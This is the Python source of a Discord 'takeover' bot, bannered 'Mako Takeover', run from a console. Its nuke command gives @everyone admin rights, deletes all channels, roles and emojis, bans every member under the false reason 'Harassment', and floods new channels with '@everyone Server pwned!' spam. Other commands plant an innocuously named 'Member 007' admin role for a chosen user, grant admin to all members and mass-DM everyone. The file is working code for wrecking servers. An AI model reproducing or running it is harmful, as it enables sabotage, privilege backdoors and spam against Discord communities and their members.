import discord
import asyncio
import random
import os
from colorama import Fore, Style, init

init(autoreset=True)

# --- Basic Config ---
# bot_token = os.environ.get('token') # Replit Secret or environment variable
bot_token = 'token' # Bot Token (replace with the actual token)
owner_id = [your_user_id_here] # Your Discord User ID(s)
# --------------------

# --- Nuke Command Config ---
SPAM_CHANNEL = ["pwned", "nuked", "destroyed"] # Spam Channel Names
SPAM_MESSAGE = ["@everyone Server pwned!", "@everyone Goodbye server!", "@everyone nuked"] # Spam Text
# ---------------------------

client = discord.Client(intents=discord.Intents.all())

cli_commands = {}


def clear_console():
    """Clears the terminal console."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.BLUE + Style.BRIGHT + '''
    __  ___      __            ______      __                            
   /  |/  /___ _/ /______     /_  __/___ _/ /_____  ____ _   _____  _____
  / /|_/ / __ `/ //_/ __ \     / / / __ `/ //_/ _ \/ __ \ | / / _ \/ ___/
 / /  / / /_/ / ,< / /_/ /    / / / /_/ / ,< /  __/ /_/ / |/ /  __/ /    
/_/  /_/\__,_/_/|_|\____/    /_/  \__,_/_/|_|\___/\____/|___/\___/_/     
                                                                         ''' + Style.RESET_ALL)
    print(Fore.GREEN + f"\nLogged in as {client.user} (ID: {client.user.id})" + Style.RESET_ALL)
    print(Fore.YELLOW + "Bot is ready! Type 'help' for commands in the console." + Style.RESET_ALL)


async def get_guild_from_user_input():
    """Prompts the user to select a guild and returns the discord.Guild object."""
    if not client.guilds:
        print(Fore.YELLOW + "The bot is not currently in any guilds." + Style.RESET_ALL)
        return None

    print(Fore.CYAN + "\nAvailable Guilds:" + Style.RESET_ALL)
    for i, guild in enumerate(client.guilds):
        print(f"{Fore.GREEN}{i+1}. {guild.name} (ID: {guild.id}){Style.RESET_ALL}")

    while True:
        try:
            choice = input(Fore.YELLOW + "Enter the number of the guild you want to target: " + Style.RESET_ALL)
            guild_index = int(choice) - 1
            if 0 <= guild_index < len(client.guilds):
                return client.guilds[guild_index]
            else:
                print(Fore.RED + "Invalid choice. Please enter a valid number." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)

async def get_member_from_user_input(guild):
    """Prompts the user to select a member from a guild and returns the discord.Member object."""
    print(Fore.CYAN + f"\nMembers in {guild.name}:" + Style.RESET_ALL)
    members_list = sorted(guild.members, key=lambda m: m.display_name.lower())
    for i, member in enumerate(members_list):
        print(f"{Fore.GREEN}{i+1}. {member.display_name} ({member.id}){Style.RESET_ALL}")

    while True:
        try:
            choice = input(Fore.YELLOW + "Enter the number of the member you want to target: " + Style.RESET_ALL)
            member_index = int(choice) - 1
            if 0 <= member_index < len(members_list):
                return members_list[member_index]
            else:
                print(Fore.RED + "Invalid choice. Please enter a valid number." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)


async def help_command():
    """Shows a list of available commands."""
    print(Fore.CYAN + "\n--- Available Commands ---" + Style.RESET_ALL)
    for cmd, func in cli_commands.items():
        print(f"{Fore.GREEN}{cmd}{Style.RESET_ALL}: {func.__doc__}")
    print(Fore.CYAN + "--------------------------" + Style.RESET_ALL)

async def clear_command():
    """Clears the console output."""
    clear_console()

async def admin_user_command():
    """Gives a new admin role to a selected member in a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    member = await get_member_from_user_input(guild)
    if not member: return

    new_role_name = "Member 007"
    role = discord.utils.get(guild.roles, name=new_role_name)

    if not role:
        try:
            role = await guild.create_role(name=new_role_name, permissions=discord.Permissions.all())
            print(Fore.GREEN + f"Role '{new_role_name}' created with admin permissions!" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.RED + "Error: Bot does not have permissions to create roles." + Style.RESET_ALL)
            return
        except Exception as e:
            print(Fore.RED + f"Error creating role: {e}" + Style.RESET_ALL)
            return
    else:
        try:
            await role.edit(permissions=discord.Permissions.all())
            print(Fore.GREEN + f"Existing role '{new_role_name}' updated with admin permissions!" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.RED + "Error: Bot does not have permissions to edit roles." + Style.RESET_ALL)
            return
        except Exception as e:
            print(Fore.RED + f"Error editing role: {e}" + Style.RESET_ALL)
            return

    try:
        await member.add_roles(role)
        print(Fore.GREEN + f"{member.display_name} has been given the '{new_role_name}' role!" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Bot does not have permissions to assign roles to {member.display_name} (check role hierarchy)." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error assigning role to {member.display_name}: {e}" + Style.RESET_ALL)

async def admin_all_command():
    """Gives @everyone admin permissions in a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    everyone_role = guild.default_role
    try:
        await everyone_role.edit(permissions=discord.Permissions.all())
        print(Fore.GREEN + f"Successfully gave @everyone admin permissions in {guild.name}!" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + "Error: Bot does not have permissions to edit @everyone role." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error updating @everyone role: {e}" + Style.RESET_ALL)

async def nuke_command():
    """Completely destroys a selected server by deleting channels/roles/emojis, banning members, and spamming channels."""
    guild = await get_guild_from_user_input()
    if not guild: return

    confirm = input(Fore.RED + f"Are you absolutely sure you want to NUKE '{guild.name}' (ID: {guild.id})? Type 'yes' to confirm: " + Style.RESET_ALL)
    if confirm.lower() != 'yes':
        print(Fore.YELLOW + "Nuke operation cancelled." + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + f"\nInitiating Nuke on '{guild.name}'..." + Style.RESET_ALL)

    everyone_role = guild.default_role
    try:
        await everyone_role.edit(permissions=discord.Permissions.all())
        print(Fore.MAGENTA + "@Everyone has been given Admin." + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.YELLOW + "Warning: Unable to give @everyone Admin (permissions issue)." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.YELLOW + f"Warning: Error setting @everyone permissions: {e}" + Style.RESET_ALL)

    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"Deleted channel: {channel.name}" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Warning: Not enough permissions to delete channel: {channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"Warning: Error deleting channel {channel.name}: {e}" + Style.RESET_ALL)

    for member in list(guild.members):
        if member.id == client.user.id or member.id in owner_id:
            continue
        try:
            await member.ban(reason="Harassment")
            print(Fore.MAGENTA + f"Banned member: {member.display_name}" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Warning: Not enough permissions to ban member: {member.display_name} (check role hierarchy)." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"Warning: Error banning member {member.display_name}: {e}" + Style.RESET_ALL)

    for role in list(guild.roles):
        if role.name == "@everyone" or role.managed:
            continue
        try:
            await role.delete()
            print(Fore.MAGENTA + f"Deleted role: {role.name}" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Warning: Not enough permissions to delete role: {role.name} (check role hierarchy)." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"Warning: Error deleting role {role.name}: {e}" + Style.RESET_ALL)

    # Delete emojis
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"Deleted emoji: {emoji.name}" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Warning: Not enough permissions to delete emoji: {emoji.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"Warning: Error deleting emoji {emoji.name}: {e}" + Style.RESET_ALL)

    # Create spam channels and send messages
    print(Fore.MAGENTA + "Creating spam channels and sending messages..." + Style.RESET_ALL)
    for _ in range(20): # Create fewer channels to avoid rate limits
        try:
            channel_name = random.choice(SPAM_CHANNEL)
            new_channel = await guild.create_text_channel(channel_name)
            await new_channel.send(random.choice(SPAM_MESSAGE))
            print(Fore.MAGENTA + f"Created and spammed in channel: {new_channel.name}" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Warning: Not enough permissions to create/spam in channel." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"Warning: Error creating/spamming channel: {e}" + Style.RESET_ALL)

    print(Fore.GREEN + f"Nuke operation on '{guild.name}' completed." + Style.RESET_ALL)

async def kick_command():
    """Kicks a selected member from a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    member = await get_member_from_user_input(guild)
    if not member: return

    reason = input(Fore.YELLOW + "Enter reason for kick (optional): " + Style.RESET_ALL)
    if not reason:
        reason = "No reason provided"

    try:
        await member.kick(reason=reason)
        print(Fore.GREEN + f"{member.display_name} has been kicked from {guild.name} for: {reason}" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Bot does not have permissions to kick {member.display_name} (check role hierarchy)." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error kicking {member.display_name}: {e}" + Style.RESET_ALL)

async def ban_command():
    """Bans a selected member from a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    member = await get_member_from_user_input(guild)
    if not member: return

    reason = input(Fore.YELLOW + "Enter reason for ban (optional): " + Style.RESET_ALL)
    if not reason:
        reason = "No reason provided"

    try:
        await member.ban(reason=reason)
        print(Fore.GREEN + f"{member.display_name} has been banned from {guild.name} for: {reason}" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Bot does not have permissions to ban {member.display_name} (check role hierarchy)." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error banning {member.display_name}: {e}" + Style.RESET_ALL)

async def unban_command():
    """Unbans a user by their name and discriminator (e.g., 'User#1234') from a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    user_input = input(Fore.YELLOW + "Enter the username and discriminator of the user to unban (e.g., 'User#1234'): " + Style.RESET_ALL)
    if '#' not in user_input:
        print(Fore.RED + "Invalid format. Please use 'Username#Discriminator'." + Style.RESET_ALL)
        return

    user_name, user_discriminator = user_input.split('#')

    banned_users = await guild.bans()
    found_user = None
    for ban_entry in banned_users:
        user = ban_entry.user
        if user.name == user_name and user.discriminator == user_discriminator:
            found_user = user
            break

    if found_user:
        try:
            await guild.unban(found_user)
            print(Fore.GREEN + f"{found_user.name}#{found_user.discriminator} has been unbanned from {guild.name}!" + Style.RESET_ALL)
        except discord.Forbidden:
            print(Fore.RED + f"Error: Bot does not have permissions to unban {found_user.name}." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error unbanning {found_user.name}: {e}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + f"User '{user_input}' not found in the ban list for {guild.name}." + Style.RESET_ALL)

async def show_permissions_command():
    """Shows all permissions the bot has in a selected server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    me = guild.me
    permissions = me.guild_permissions

    print(Fore.CYAN + f"\nBot's Permissions in '{guild.name}':" + Style.RESET_ALL)
    for perm_name, has_perm in iter(permissions):
        color = Fore.GREEN if has_perm else Fore.RED
        print(f"{color}{perm_name.replace('_', ' ').title()}: {has_perm}{Style.RESET_ALL}")
    print(Fore.CYAN + "---------------------------------" + Style.RESET_ALL)

async def create_invite_command():
    """Creates a new invite link for a selected server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    target_channel = guild.text_channels[0] if guild.text_channels else None

    if not target_channel:
        print(Fore.RED + f"Error: No text channels found in {guild.name} to create an invite for." + Style.RESET_ALL)
        return

    try:
        invite = await target_channel.create_invite(max_age=0, max_uses=0, reason="CLI requested invite")
        print(Fore.GREEN + f"New invite link for '{guild.name}': {invite.url}" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Bot does not have permissions to create invites in {target_channel.name}." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error creating invite: {e}" + Style.RESET_ALL)

async def show_invite_command():
    """Shows existing active invite links for a selected server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    try:
        invites = await guild.invites()
        if invites:
            print(Fore.CYAN + f"\nActive Invite Links for '{guild.name}':" + Style.RESET_ALL)
            for invite in invites:
                print(f"{Fore.GREEN}  - {invite.url} (Uses: {invite.uses if invite.uses is not None else '∞'}, Expires: {invite.expires_at if invite.expires_at else 'Never'}){Style.RESET_ALL}")
        else:
            print(Fore.YELLOW + f"No active invite links found for '{guild.name}'." + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Bot does not have permissions to view invites in '{guild.name}'." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error fetching invites: {e}" + Style.RESET_ALL)

async def dm_user_command():
    """Sends a direct message to a selected user in a chosen server."""
    guild = await get_guild_from_user_input()
    if not guild: return

    member = await get_member_from_user_input(guild)
    if not member: return

    message_content = input(Fore.YELLOW + f"Enter the message to send to {member.display_name}: " + Style.RESET_ALL)
    if not message_content:
        print(Fore.YELLOW + "DM cancelled: No message content provided." + Style.RESET_ALL)
        return

    try:
        await member.send(message_content)
        print(Fore.GREEN + f"Successfully DMed {member.display_name}." + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"Error: Could not DM {member.display_name}. They might have DMs disabled or the bot lacks permissions." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error DMLing {member.display_name}: {e}" + Style.RESET_ALL)

async def dm_all_command():
    """Sends a direct message to all users in a selected server (if the bot can DM them)."""
    guild = await get_guild_from_user_input()
    if not guild: return

    message_content = input(Fore.YELLOW + f"Enter the message to send to ALL members in {guild.name}: " + Style.RESET_ALL)
    if not message_content:
        print(Fore.YELLOW + "DM all cancelled: No message content provided." + Style.RESET_ALL)
        return

    confirm = input(Fore.RED + f"Are you sure you want to DM ALL {len(guild.members)} members in '{guild.name}'? Type 'yes' to confirm: " + Style.RESET_ALL)
    if confirm.lower() != 'yes':
        print(Fore.YELLOW + "DM all operation cancelled." + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + f"\nAttempting to DM all members in '{guild.name}'..." + Style.RESET_ALL)
    dm_success_count = 0
    dm_fail_count = 0

    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message_content)
            print(Fore.GREEN + f"DMed: {member.display_name}" + Style.RESET_ALL)
            dm_success_count += 1
            await asyncio.sleep(1)
        except discord.Forbidden:
            print(Fore.YELLOW + f"Could not DM {member.display_name} (DMs disabled or permissions issue)." + Style.RESET_ALL)
            dm_fail_count += 1
        except Exception as e:
            print(Fore.YELLOW + f"Error DMLing {member.display_name}: {e}" + Style.RESET_ALL)
            dm_fail_count += 1
    
    print(Fore.CYAN + f"\nDM all complete. Successful DMs: {dm_success_count}, Failed DMs: {dm_fail_count}" + Style.RESET_ALL)


cli_commands = {
    "help": help_command,
    "clear": clear_command,
    "admin_user": admin_user_command,
    "admin_all": admin_all_command,
    "nuke": nuke_command,
    "kick": kick_command,
    "ban": ban_command,
    "unban": unban_command,
    "show_permissions": show_permissions_command,
    "create_invite": create_invite_command,
    "show_invite": show_invite_command,
    "dm_user": dm_user_command,
    "dm_all": dm_all_command,
}


# --- Bot Events ---
@client.event
async def on_ready():
    clear_console()
    asyncio.create_task(cli_loop())

@client.event
async def on_guild_join(guild):
    print(Fore.CYAN + f"Joined new guild: {guild.name} (ID: {guild.id})" + Style.RESET_ALL)

@client.event
async def on_guild_remove(guild):
    print(Fore.YELLOW + f"Left guild: {guild.name} (ID: {guild.id})" + Style.RESET_ALL)


async def cli_loop():
    while True:
        command_input = await asyncio.to_thread(input, Fore.BLUE + "\nEnter command > " + Style.RESET_ALL)
        command_input = command_input.strip().lower()

        if command_input == "exit":
            print(Fore.RED + "Exiting bot." + Style.RESET_ALL)
            await client.close()
            break
        elif command_input in cli_commands:
            try:
                await cli_commands[command_input]()
            except Exception as e:
                print(Fore.RED + f"Error executing command '{command_input}': {e}" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "Unknown command. Type 'help' for a list of commands." + Style.RESET_ALL)


# --- Bot Run ---
async def main():
    try:
        await client.start(bot_token)
    except discord.LoginFailure:
        print(Fore.RED + "Error: Invalid bot token. Please check your token." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred during bot startup: {e}" + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\nBot process interrupted by user." + Style.RESET_ALL)
